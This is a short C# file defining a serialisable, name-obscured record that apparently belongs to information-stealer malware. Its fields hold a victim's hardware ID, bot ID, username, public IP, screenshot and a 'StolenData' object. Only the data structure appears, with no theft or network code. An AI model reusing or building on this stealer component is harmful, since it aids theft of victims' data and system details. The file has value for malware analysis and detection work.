using System;
using System.Runtime.Serialization;


[DataContract(Name = "Entity7", Namespace = "Entity")]
public struct Entity_CollectedResults 
{

	[DataMember(Name = "Id1")]
	public string HWID { get; set; }

	[DataMember(Name = "Id2")]
	public string BotID { get; set; }

	[DataMember(Name = "Id3")]
	public string UserName { get; set; }

	[DataMember(Name = "Id4")]
	public string WindowsVersion { get; set; }

	[DataMember(Name = "Id5")]
	public string InputLanguage { get; set; }

	[DataMember(Name = "Id6")]
	public string MonitorSize { get; set; }

	[DataMember(Name = "Id7")]
	public Entity_StolenData StolenData { get; set; }

	[DataMember(Name = "Id8")]
	public string Id8 { get; set; }

	[DataMember(Name = "Id9")]
	public string Id9 { get; set; }

	[DataMember(Name = "Id10")]
	public string TimeZone { get; set; }

	[DataMember(Name = "Id11")]
	public string PublicIP { get; set; }

	[DataMember(Name = "Id12")]
	public byte[] Screenshot { get; set; }

	[DataMember(Name = "Id13")]
	public string Id13 { get; set; }

	[DataMember(Name = "Id14")]
	public string AppLocation { get; set; }

	[DataMember(Name = "Id15")]
	public bool AlreadySeen { get; set; }
}
